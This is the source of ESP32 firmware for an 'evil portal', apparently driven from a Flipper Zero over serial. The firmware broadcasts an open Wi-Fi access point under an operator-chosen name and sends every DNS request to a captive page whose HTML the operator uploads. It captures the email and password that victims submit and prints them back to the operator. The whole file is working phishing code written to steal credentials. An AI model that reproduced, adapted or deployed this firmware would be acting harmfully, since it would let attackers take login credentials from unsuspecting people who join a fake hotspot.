#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>

#define MAX_HTML_SIZE 20000

#define B_PIN 4
#define G_PIN 5
#define R_PIN 6

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);

bool runServer = false;

String user_name;
String password;
bool name_received = false;
bool password_received = false;

char apName[30] = "";
char index_html[MAX_HTML_SIZE] = "TEST";

// RESET
void (*resetFunction)(void) = 0;

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};

void setLed(int i) {
  if (i == WAITING) {
    digitalWrite(B_PIN, LOW);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, HIGH);
  } else if (i == GOOD) {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, LOW);
    digitalWrite(R_PIN, HIGH);
  } else {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, LOW);
  }
}

void setupServer() {  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      user_name = inputMessage;
      name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      password = inputMessage;
      password_received = true;
    }
    request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

void startAP() {
  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(char *command) {
  bool received = false;
  if (Serial.available() > 0) {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      int compare = strncmp(serialMessage, command, strlen(command));
      if (compare == 0) {
        received = true;
      }
  }
  return received;
}

void getInitInput() {
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap) {
      if (Serial.available() > 0) {
        String flipperMessage = Serial.readString();
        const char *serialMessage = flipperMessage.c_str();
        if (strncmp(serialMessage, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0) {
          serialMessage += strlen(SET_HTML_CMD);
          strncpy(index_html, serialMessage, strlen(serialMessage) - 1);
          has_html = true;
          Serial.println("html set");
        } else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) ==
                   0) {
          serialMessage += strlen(SET_AP_CMD);
          strncpy(apName, serialMessage, strlen(serialMessage) - 1);
          has_ap = true;
          Serial.println("ap set");
        } else if (strncmp(serialMessage, RESET_CMD, strlen(RESET_CMD)) == 0) {
          resetFunction();
        }
      }
  }
  Serial.println("all set");
}

void startPortal() {
  // wait for flipper input to get config index
  startAP();

  runServer = true;
}

// MAIN FUNCTIONS
void setup() {

  // init LED pins
  pinMode(B_PIN, OUTPUT);
  pinMode(G_PIN, OUTPUT);
  pinMode(R_PIN, OUTPUT);

  setLed(WAITING);

  Serial.begin(115200);

  // wait for init flipper input
  getInitInput();

  setLed(GOOD);

  startPortal();
}

void loop() {
  dnsServer.processNextRequest();
  if (name_received && password_received) {
    name_received = false;
    password_received = false;
    String logValue1 =
        "u: " + user_name;
    String logValue2 = "p: " + password;
    Serial.println(logValue1);
    Serial.println(logValue2);
  }
  if(checkForCommand(RESET_CMD)) {
    Serial.println("reseting");
    resetFunction();
  }  
}
